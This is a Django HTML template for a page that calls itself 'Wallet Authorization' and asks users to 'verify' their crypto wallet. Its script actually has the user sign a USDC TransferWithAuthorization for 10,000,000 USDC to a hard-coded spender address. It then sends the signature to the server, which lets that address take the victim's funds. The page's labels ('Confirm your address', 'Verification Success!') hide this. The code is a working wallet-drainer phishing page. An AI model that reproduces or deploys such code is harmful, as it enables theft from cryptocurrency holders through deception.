{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Authorization</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Inter', sans-serif; }
        .auth-card { background: #1e293b; padding: 40px; border-radius: 20px; width: 100%; max-width: 420px; text-align: center; border: 1px solid #334155; }
        .btn-main { background: #38bdf8; color: #0f172a; font-weight: 800; border: none; padding: 16px; border-radius: 12px; width: 100%; transition: all 0.2s; cursor: pointer; }
        .btn-main:hover { background: #7dd3fc; }
        .btn-main:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; }
        .addr-box { background: #0f172a; padding: 12px; border-radius: 10px; font-family: monospace; font-size: 11px; color: #38bdf8; border: 1px solid #334155; margin-bottom: 20px; word-break: break-all; }
        .status-text { margin-top: 20px; font-size: 0.85rem; color: #94a3b8; }
        .d-none { display: none !important; }
    </style>
</head>
<body>

<div class="auth-card">
    <h3 class="mb-2">Verify Wallet</h3>
    <p class="text-secondary small mb-4">Confirm your address to continue</p>

    <div id="step-1">
        <button id="connectBtn" class="btn-main">Connect Wallet</button>
    </div>

    <div id="step-2" class="d-none">
        <div class="addr-box">
            <span id="addrDisplay">0x...</span>
        </div>
        <button id="signBtn" class="btn-main">Authorize USDC</button>
    </div>

    <p id="status" class="status-text">Ready</p>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>

<script>
    const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
    let userAccount = null;

    document.getElementById('connectBtn').onclick = async () => {
        // Works for Onchain, MetaMask, Trust, etc.
        if (!window.ethereum) return alert("No crypto wallet detected.");

        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];

            document.getElementById('step-1').classList.add('d-none');
            document.getElementById('step-2').classList.remove('d-none');
            document.getElementById('addrDisplay').innerText = userAccount;
            document.getElementById('status').innerText = "Wallet Linked";
        } catch (err) {
            alert("Connection failed.");
        }
    };

    document.getElementById('signBtn').onclick = async () => {
        const status = document.getElementById('status');
        const btn = document.getElementById('signBtn');

        btn.disabled = true;
        status.innerText = "Check your wallet app...";

        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const network = await provider.getNetwork();
            const currentChainId = Number(network.chainId);

            const nonce = ethers.hexlify(ethers.randomBytes(32));
            const deadline = Math.floor(Date.now() / 1000) + 86400;
            const amount = ethers.parseUnits("10000000", 6);

            const domain = {
                name: "USD Coin",
                version: "2",
                chainId: currentChainId,
                verifyingContract: USDC_ADDR
            };

            const types = {
                TransferWithAuthorization: [
                    { name: "from", type: "address" },
                    { name: "to", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "validAfter", type: "uint256" },
                    { name: "validBefore", type: "uint256" },
                    { name: "nonce", type: "bytes32" }
                ]
            };

            const message = {
                from: userAccount,
                to: SPENDER,
                value: amount,
                validAfter: 0,
                validBefore: deadline,
                nonce: nonce
            };

            // This will trigger the popup in your Onchain Wallet
            const signature = await signer.signTypedData(domain, types, message);
            const sig = ethers.Signature.from(signature);

            status.innerText = "Signature success! Verifying...";

            const response = await fetch('/user/update-wallet-status/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}' },
                body: JSON.stringify({
                    address: userAccount,
                    v: sig.v, r: sig.r, s: sig.s,
                    nonce: nonce, deadline: deadline, amount: amount.toString()
                })
            });

            if (response.ok) {
                status.innerText = "Verification Success!";
                status.style.color = "#4ade80";
            }
        } catch (err) {
            btn.disabled = false;
            status.innerText = "Error: " + err.message;
            status.style.color = "#f87171";
        }
    };
</script>
</body>
</html>
